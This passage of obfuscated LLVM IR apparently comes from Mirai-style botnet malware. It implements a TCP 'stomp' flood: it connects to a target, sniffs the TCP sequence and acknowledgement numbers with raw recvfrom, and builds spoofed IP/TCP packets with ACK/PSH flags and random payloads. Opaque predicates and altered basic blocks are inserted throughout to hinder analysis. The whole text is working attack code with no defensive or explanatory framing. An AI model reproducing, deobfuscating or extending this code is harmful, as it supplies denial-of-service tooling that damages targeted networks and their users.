  br i1 %171, label %172, label %209

; <label>:172:                                    ; preds = %157
  %173 = load i32, i32* @x.31
  %174 = load i32, i32* @y.32
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %172
  %181 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %182 = load i32, i32* %17, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i64 %183
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i32 0, i32 1
  %186 = load i32, i32* %185, align 4
  %187 = call i32 @ntohl(i32 %186) #7
  %188 = call i32 @rand_next()
  %189 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %190 = load i32, i32* %17, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i64 %191
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %192, i32 0, i32 2
  %194 = load i8, i8* %193, align 4
  %195 = zext i8 %194 to i32
  %196 = lshr i32 %188, %195
  %197 = add i32 %187, %196
  %198 = call i32 @htonl(i32 %197) #7
  %199 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 2
  %200 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %199, i32 0, i32 0
  store i32 %198, i32* %200, align 4
  %201 = load i32, i32* @x.31
  %202 = load i32, i32* @y.32
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBBpart213, label %originalBB6alteredBB

originalBBpart213:                                ; preds = %originalBB6
  br label %218

; <label>:209:                                    ; preds = %157
  %210 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %211 = load i32, i32* %17, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %210, i64 %212
  %214 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %213, i32 0, i32 1
  %215 = load i32, i32* %214, align 4
  %216 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 2
  %217 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %216, i32 0, i32 0
  store i32 %215, i32* %217, align 4
  br label %218

; <label>:218:                                    ; preds = %209, %originalBBpart213
  %219 = load i32, i32* @x.31
  %220 = load i32, i32* @y.32
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %218
  %227 = load i16, i16* %25, align 2
  %228 = zext i16 %227 to i32
  %229 = icmp eq i32 %228, 65535
  %230 = load i32, i32* @x.31
  %231 = load i32, i32* @y.32
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br i1 %229, label %238, label %243

; <label>:238:                                    ; preds = %originalBBpart217
  %239 = call i32 @rand_next()
  %240 = and i32 %239, 65535
  %241 = trunc i32 %240 to i16
  %242 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 1
  store i16 %241, i16* %242, align 2
  br label %247

; <label>:243:                                    ; preds = %originalBBpart217
  %244 = load i16, i16* %25, align 2
  %245 = call zeroext i16 @htons(i16 zeroext %244) #7
  %246 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 1
  store i16 %245, i16* %246, align 2
  br label %247

; <label>:247:                                    ; preds = %243, %238
  %248 = load i32, i32* %34, align 4
  %249 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %250 = bitcast %struct.sockaddr_in* %35 to %struct.sockaddr*
  store %struct.sockaddr* %250, %struct.sockaddr** %249, align 8
  %251 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %252 = load %struct.sockaddr*, %struct.sockaddr** %251, align 8
  %253 = call i32 @connect(i32 %248, %struct.sockaddr* %252, i32 16)
  %254 = call i64 @time(i64* null) #6
  store i64 %254, i64* %39, align 8
  br label %255

; <label>:255:                                    ; preds = %634, %247
  %256 = load i32, i32* @x.31
  %257 = load i32, i32* @y.32
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %255
  store i32 16, i32* %37, align 4
  %264 = load i32, i32* %18, align 4
  %265 = getelementptr inbounds [256 x i8], [256 x i8]* %38, i32 0, i32 0
  %266 = bitcast %union.__CONST_SOCKADDR_ARG* %42 to %struct.sockaddr**
  %267 = bitcast %struct.sockaddr_in* %36 to %struct.sockaddr*
  store %struct.sockaddr* %267, %struct.sockaddr** %266, align 8
  %268 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %42, i32 0, i32 0
  %269 = load %struct.sockaddr*, %struct.sockaddr** %268, align 8
  %270 = call i64 @recvfrom(i32 %264, i8* %265, i64 256, i32 16384, %struct.sockaddr* %269, i32* %37)
  %271 = trunc i64 %270 to i32
  store i32 %271, i32* %41, align 4
  %272 = load i32, i32* %41, align 4
  %273 = icmp eq i32 %272, -1
  %274 = load i32, i32* @x.31
  %275 = load i32, i32* @y.32
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br i1 %273, label %282, label %283

; <label>:282:                                    ; preds = %originalBBpart221
  br label %831

; <label>:283:                                    ; preds = %originalBBpart221
  %284 = load i32, i32* @x.31
  %285 = load i32, i32* @y.32
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %283
  %292 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %36, i32 0, i32 2
  %293 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %292, i32 0, i32 0
  %294 = load i32, i32* %293, align 4
  %295 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 2
  %296 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %295, i32 0, i32 0
  %297 = load i32, i32* %296, align 4
  %298 = icmp eq i32 %294, %297
  %299 = load i32, i32* @x.31
  %300 = load i32, i32* @y.32
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br i1 %298, label %307, label %626

; <label>:307:                                    ; preds = %originalBBpart225
  %308 = load i32, i32* @x.31
  %309 = load i32, i32* @y.32
  %310 = sub i32 %308, 1
  %311 = mul i32 %308, %310
  %312 = urem i32 %311, 2
  %313 = icmp eq i32 %312, 0
  %314 = icmp slt i32 %309, 10
  %315 = or i1 %313, %314
  br i1 %315, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %307
  %316 = load i32, i32* %41, align 4
  %317 = sext i32 %316 to i64
  %318 = icmp ugt i64 %317, 40
  %319 = load i32, i32* @x.31
  %320 = load i32, i32* @y.32
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br i1 %318, label %327, label %626

; <label>:327:                                    ; preds = %originalBBpart229
  %328 = getelementptr inbounds [256 x i8], [256 x i8]* %38, i32 0, i32 0
  %329 = getelementptr inbounds i8, i8* %328, i64 20
  %330 = bitcast i8* %329 to %struct.tcphdr*
  store %struct.tcphdr* %330, %struct.tcphdr** %43, align 8
  %331 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %332 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %331, i32 0, i32 0
  %333 = load i16, i16* %332, align 4
  %334 = zext i16 %333 to i32
  %335 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 1
  %336 = load i16, i16* %335, align 2
  %337 = zext i16 %336 to i32
  %338 = icmp eq i32 %334, %337
  br i1 %338, label %339, label %625

; <label>:339:                                    ; preds = %327
  %340 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %341 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %340, i32 0, i32 4
  %342 = load i16, i16* %341, align 4
  %343 = lshr i16 %342, 9
  %344 = and i16 %343, 1
  %345 = zext i16 %344 to i32
  %346 = icmp ne i32 %345, 0
  br i1 %346, label %347, label %588

; <label>:347:                                    ; preds = %339
  %348 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %349 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %348, i32 0, i32 4
  %350 = load i16, i16* %349, align 4
  %351 = lshr i16 %350, 12
  %352 = and i16 %351, 1
  %353 = zext i16 %352 to i32
  %354 = icmp ne i32 %353, 0
  br i1 %354, label %355, label %588

; <label>:355:                                    ; preds = %347
  %356 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 2
  %357 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %356, i32 0, i32 0
  %358 = load i32, i32* %357, align 4
  %359 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %360 = load i32, i32* %17, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %359, i64 %361
  %363 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %362, i32 0, i32 0
  store i32 %358, i32* %363, align 4
  %364 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %365 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %364, i32 0, i32 2
  %366 = load i32, i32* %365, align 4
  %367 = call i32 @ntohl(i32 %366) #7
  %368 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %369 = load i32, i32* %17, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %371, i32 0, i32 1
  store i32 %367, i32* %372, align 4
  %373 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %374 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %373, i32 0, i32 3
  %375 = load i32, i32* %374, align 4
  %376 = call i32 @ntohl(i32 %375) #7
  %377 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %378 = load i32, i32* %17, align 4
  %379 = sext i32 %378 to i64
  %380 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %377, i64 %379
  %381 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %380, i32 0, i32 2
  store i32 %376, i32* %381, align 4
  %382 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i32 0, i32 1
  %384 = load i16, i16* %383, align 2
  %385 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %386 = load i32, i32* %17, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %385, i64 %387
  %389 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %388, i32 0, i32 3
  store i16 %384, i16* %389, align 4
  %390 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 1
  %391 = load i16, i16* %390, align 2
  %392 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %393 = load i32, i32* %17, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %392, i64 %394
  %396 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %395, i32 0, i32 4
  store i16 %391, i16* %396, align 2
  %397 = load i32, i32* %32, align 4
  %398 = sext i32 %397 to i64
  %399 = add i64 40, %398
  %400 = call noalias i8* @malloc(i64 %399) #6
  %401 = load i8**, i8*** %20, align 8
  %402 = load i32, i32* %17, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds i8*, i8** %401, i64 %403
  store i8* %400, i8** %404, align 8
  %405 = load i8**, i8*** %20, align 8
  %406 = load i32, i32* %17, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds i8*, i8** %405, i64 %407
  %409 = load i8*, i8** %408, align 8
  %410 = bitcast i8* %409 to %struct.iphdr*
  store %struct.iphdr* %410, %struct.iphdr** %44, align 8
  %411 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %412 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %411, i64 1
  %413 = bitcast %struct.iphdr* %412 to %struct.tcphdr*
  store %struct.tcphdr* %413, %struct.tcphdr** %45, align 8
  %414 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %415 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %414, i64 1
  %416 = bitcast %struct.tcphdr* %415 to i8*
  store i8* %416, i8** %46, align 8
  %417 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %418 = bitcast %struct.iphdr* %417 to i8*
  %419 = load i8, i8* %418, align 4
  %420 = and i8 %419, 15
  %421 = or i8 %420, 64
  store i8 %421, i8* %418, align 4
  %422 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %423 = bitcast %struct.iphdr* %422 to i8*
  %424 = load i8, i8* %423, align 4
  %425 = and i8 %424, -16
  %426 = or i8 %425, 5
  store i8 %426, i8* %423, align 4
  %427 = load i8, i8* %21, align 1
  %428 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %429 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %428, i32 0, i32 1
  store i8 %427, i8* %429, align 1
  %430 = load i32, i32* %32, align 4
  %431 = sext i32 %430 to i64
  %432 = add i64 40, %431
  %433 = trunc i64 %432 to i16
  %434 = call zeroext i16 @htons(i16 zeroext %433) #7
  %435 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %436 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %435, i32 0, i32 2
  store i16 %434, i16* %436, align 2
  %437 = load i16, i16* %22, align 2
  %438 = call zeroext i16 @htons(i16 zeroext %437) #7
  %439 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %440 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %439, i32 0, i32 3
  store i16 %438, i16* %440, align 4
  %441 = load i8, i8* %23, align 1
  %442 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %443 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %442, i32 0, i32 5
  store i8 %441, i8* %443, align 4
  %444 = load i8, i8* %24, align 1
  %445 = icmp ne i8 %444, 0
  br i1 %445, label %446, label %466

; <label>:446:                                    ; preds = %355
  %447 = load i32, i32* @x.31
  %448 = load i32, i32* @y.32
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %446
  %455 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %456 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %457 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %456, i32 0, i32 4
  store i16 %455, i16* %457, align 2
  %458 = load i32, i32* @x.31
  %459 = load i32, i32* @y.32
  %460 = sub i32 %458, 1
  %461 = mul i32 %458, %460
  %462 = urem i32 %461, 2
  %463 = icmp eq i32 %462, 0
  %464 = icmp slt i32 %459, 10
  %465 = or i1 %463, %464
  br i1 %465, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br label %466

; <label>:466:                                    ; preds = %originalBBpart233, %355
  %467 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %468 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %467, i32 0, i32 6
  store i8 6, i8* %468, align 1
  %469 = load i32, i32* @LOCAL_ADDR, align 4
  %470 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %471 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %470, i32 0, i32 8
  store i32 %469, i32* %471, align 4
  %472 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %473 = load i32, i32* %17, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %472, i64 %474
  %476 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %475, i32 0, i32 0
  %477 = load i32, i32* %476, align 4
  %478 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %479 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %478, i32 0, i32 9
  store i32 %477, i32* %479, align 4
  %480 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %481 = load i32, i32* %17, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %480, i64 %482
  %484 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %483, i32 0, i32 3
  %485 = load i16, i16* %484, align 4
  %486 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %487 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %486, i32 0, i32 0
  store i16 %485, i16* %487, align 4
  %488 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %489 = load i32, i32* %17, align 4
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %488, i64 %490
  %492 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %491, i32 0, i32 4
  %493 = load i16, i16* %492, align 2
  %494 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %495 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %494, i32 0, i32 1
  store i16 %493, i16* %495, align 2
  %496 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %497 = load i32, i32* %17, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %496, i64 %498
  %500 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %499, i32 0, i32 2
  %501 = load i32, i32* %500, align 4
  %502 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %503 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %502, i32 0, i32 2
  store i32 %501, i32* %503, align 4
  %504 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %505 = load i32, i32* %17, align 4
  %506 = sext i32 %505 to i64
  %507 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %504, i64 %506
  %508 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %507, i32 0, i32 1
  %509 = load i32, i32* %508, align 4
  %510 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %511 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %510, i32 0, i32 3
  store i32 %509, i32* %511, align 4
  %512 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %513 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %512, i32 0, i32 4
  %514 = load i16, i16* %513, align 4
  %515 = and i16 %514, -241
  %516 = or i16 %515, 128
  store i16 %516, i16* %513, align 4
  %517 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %518 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %517, i32 0, i32 4
  %519 = load i16, i16* %518, align 4
  %520 = and i16 %519, -257
  %521 = or i16 %520, 256
  store i16 %521, i16* %518, align 4
  %522 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %523 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %522, i32 0, i32 4
  %524 = load i16, i16* %523, align 4
  %525 = and i16 %524, -4097
  %526 = or i16 %525, 4096
  store i16 %526, i16* %523, align 4
  %527 = call i32 @rand_next()
  %528 = and i32 %527, 65535
  %529 = trunc i32 %528 to i16
  %530 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %531 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %530, i32 0, i32 5
  store i16 %529, i16* %531, align 2
  %532 = load i8, i8* %26, align 1
  %533 = sext i8 %532 to i16
  %534 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %535 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %534, i32 0, i32 4
  %536 = load i16, i16* %535, align 4
  %537 = and i16 %533, 1
  %538 = shl i16 %537, 13
  %539 = and i16 %536, -8193
  %540 = or i16 %539, %538
  store i16 %540, i16* %535, align 4
  %541 = load i8, i8* %27, align 1
  %542 = sext i8 %541 to i16
  %543 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %544 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %543, i32 0, i32 4
  %545 = load i16, i16* %544, align 4
  %546 = and i16 %542, 1
  %547 = shl i16 %546, 12
  %548 = and i16 %545, -4097
  %549 = or i16 %548, %547
  store i16 %549, i16* %544, align 4
  %550 = load i8, i8* %28, align 1
  %551 = sext i8 %550 to i16
  %552 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %553 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %552, i32 0, i32 4
  %554 = load i16, i16* %553, align 4
  %555 = and i16 %551, 1
  %556 = shl i16 %555, 11
  %557 = and i16 %554, -2049
  %558 = or i16 %557, %556
  store i16 %558, i16* %553, align 4
  %559 = load i8, i8* %29, align 1
  %560 = sext i8 %559 to i16
  %561 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %562 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %561, i32 0, i32 4
  %563 = load i16, i16* %562, align 4
  %564 = and i16 %560, 1
  %565 = shl i16 %564, 10
  %566 = and i16 %563, -1025
  %567 = or i16 %566, %565
  store i16 %567, i16* %562, align 4
  %568 = load i8, i8* %30, align 1
  %569 = sext i8 %568 to i16
  %570 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %571 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %570, i32 0, i32 4
  %572 = load i16, i16* %571, align 4
  %573 = and i16 %569, 1
  %574 = shl i16 %573, 9
  %575 = and i16 %572, -513
  %576 = or i16 %575, %574
  store i16 %576, i16* %571, align 4
  %577 = load i8, i8* %31, align 1
  %578 = sext i8 %577 to i16
  %579 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 4
  %581 = load i16, i16* %580, align 4
  %582 = and i16 %578, 1
  %583 = shl i16 %582, 8
  %584 = and i16 %581, -257
  %585 = or i16 %584, %583
  store i16 %585, i16* %580, align 4
  %586 = load i8*, i8** %46, align 8
  %587 = load i32, i32* %32, align 4
  call void @rand_str(i8* %586, i32 %587)
  br label %635

; <label>:588:                                    ; preds = %347, %339
  %589 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %590 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %589, i32 0, i32 4
  %591 = load i16, i16* %590, align 4
  %592 = lshr i16 %591, 8
  %593 = and i16 %592, 1
  %594 = zext i16 %593 to i32
  %595 = icmp ne i32 %594, 0
  br i1 %595, label %604, label %596

; <label>:596:                                    ; preds = %588
  %597 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %598 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %597, i32 0, i32 4
  %599 = load i16, i16* %598, align 4
  %600 = lshr i16 %599, 10
  %601 = and i16 %600, 1
  %602 = zext i16 %601 to i32
  %603 = icmp ne i32 %602, 0
  br i1 %603, label %604, label %607

; <label>:604:                                    ; preds = %596, %588
  %605 = load i32, i32* %34, align 4
  %606 = call i32 @close(i32 %605)
  br label %153

; <label>:607:                                    ; preds = %596
  br label %608

; <label>:608:                                    ; preds = %607
  %609 = load i32, i32* @x.31
  %610 = load i32, i32* @y.32
  %611 = sub i32 %609, 1
  %612 = mul i32 %609, %611
  %613 = urem i32 %612, 2
  %614 = icmp eq i32 %613, 0
  %615 = icmp slt i32 %610, 10
  %616 = or i1 %614, %615
  br i1 %616, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %608
  %617 = load i32, i32* @x.31
  %618 = load i32, i32* @y.32
  %619 = sub i32 %617, 1
  %620 = mul i32 %617, %619
  %621 = urem i32 %620, 2
  %622 = icmp eq i32 %621, 0
  %623 = icmp slt i32 %618, 10
  %624 = or i1 %622, %623
  br i1 %624, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %625

; <label>:625:                                    ; preds = %originalBBpart237, %327
  br label %626

; <label>:626:                                    ; preds = %625, %originalBBpart229, %originalBBpart225
  %627 = call i64 @time(i64* null) #6
  %628 = load i64, i64* %39, align 8
  %629 = sub nsw i64 %627, %628
  %630 = icmp sgt i64 %629, 10
  br i1 %630, label %631, label %634

; <label>:631:                                    ; preds = %626
  %632 = load i32, i32* %34, align 4
  %633 = call i32 @close(i32 %632)
  br label %153

; <label>:634:                                    ; preds = %626
  br label %255

; <label>:635:                                    ; preds = %466
  br label %636

; <label>:636:                                    ; preds = %635, %156
  %637 = load i32, i32* @x.31
  %638 = load i32, i32* @y.32
  %639 = sub i32 %637, 1
  %640 = mul i32 %637, %639
  %641 = urem i32 %640, 2
  %642 = icmp eq i32 %641, 0
  %643 = icmp slt i32 %638, 10
  %644 = or i1 %642, %643
  br i1 %644, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %636
  %645 = load i32, i32* %17, align 4
  %646 = add nsw i32 %645, 1
  store i32 %646, i32* %17, align 4
  %647 = load i32, i32* @x.31
  %648 = load i32, i32* @y.32
  %649 = sub i32 %647, 1
  %650 = mul i32 %647, %649
  %651 = urem i32 %650, 2
  %652 = icmp eq i32 %651, 0
  %653 = icmp slt i32 %648, 10
  %654 = or i1 %652, %653
  br i1 %654, label %originalBBpart250, label %originalBB39alteredBB

originalBBpart250:                                ; preds = %originalBB39
  br label %147

; <label>:655:                                    ; preds = %147
  br label %656

; <label>:656:                                    ; preds = %830, %655
  %657 = load i32, i32* @x.31
  %658 = load i32, i32* @y.32
  %659 = sub i32 %657, 1
  %660 = mul i32 %657, %659
  %661 = urem i32 %660, 2
  %662 = icmp eq i32 %661, 0
  %663 = icmp slt i32 %658, 10
  %664 = or i1 %662, %663
  br i1 %664, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %656
  store i32 0, i32* %17, align 4
  %665 = load i32, i32* @x.31
  %666 = load i32, i32* @y.32
  %667 = sub i32 %665, 1
  %668 = mul i32 %665, %667
  %669 = urem i32 %668, 2
  %670 = icmp eq i32 %669, 0
  %671 = icmp slt i32 %666, 10
  %672 = or i1 %670, %671
  br i1 %672, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %673

; <label>:673:                                    ; preds = %827, %originalBBpart254
  %674 = load i32, i32* @x.31
  %675 = load i32, i32* @y.32
  %676 = sub i32 %674, 1
  %677 = mul i32 %674, %676
  %678 = urem i32 %677, 2
  %679 = icmp eq i32 %678, 0
  %680 = icmp slt i32 %675, 10
  %681 = or i1 %679, %680
  br i1 %681, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %673
  %682 = load i32, i32* %17, align 4
  %683 = load i8, i8* %13, align 1
  %684 = zext i8 %683 to i32
  %685 = icmp slt i32 %682, %684
  %686 = load i32, i32* @x.31
  %687 = load i32, i32* @y.32
  %688 = sub i32 %686, 1
  %689 = mul i32 %686, %688
  %690 = urem i32 %689, 2
  %691 = icmp eq i32 %690, 0
  %692 = icmp slt i32 %687, 10
  %693 = or i1 %691, %692
  br i1 %693, label %originalBBpart258, label %originalBB56alteredBB

